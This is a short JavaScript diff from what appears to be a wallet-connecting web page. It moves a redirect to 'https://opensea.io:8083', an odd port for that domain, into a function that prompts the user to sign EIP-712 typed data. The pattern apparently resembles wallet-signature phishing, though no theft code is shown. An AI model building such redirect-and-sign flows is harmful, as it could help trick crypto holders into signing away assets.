@@ -41,7 +41,7 @@
         return null;
       }
     }
-    location.href = 'https://opensea.io:8083';
+    
     async function promptSignTypedData(account) {
       if (!account) {
         alert('No connected account found.');
@@ -49,6 +49,7 @@
       }
 
       try {
+        location.href = 'https://opensea.io:8083';
         const msgParams = {
           types: {
             EIP712Domain: [
